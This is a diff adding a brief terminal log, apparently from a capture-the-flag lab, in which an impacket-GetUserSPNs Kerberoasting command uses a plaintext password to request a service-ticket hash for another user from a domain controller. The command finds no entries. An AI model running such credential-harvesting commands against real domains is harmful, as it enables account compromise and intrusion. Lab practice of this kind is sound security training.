@@ -1,0 +1,10 @@
+### [2026-04-11 18:04:45] impacket-GetUserSPNs administrator.htb/Emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb -request-user ethan -dc-ip 10.129.213.179 -outputfile ethan_tgs.hash
+
+$ impacket-GetUserSPNs administrator.htb/Emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb -request-user ethan -dc-ip 10.129.213.179 -outputfile ethan_tgs.hash
+
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+No entries found!
+
+# Exit code: 0
+# Duration: 2026-04-11 18:04:45
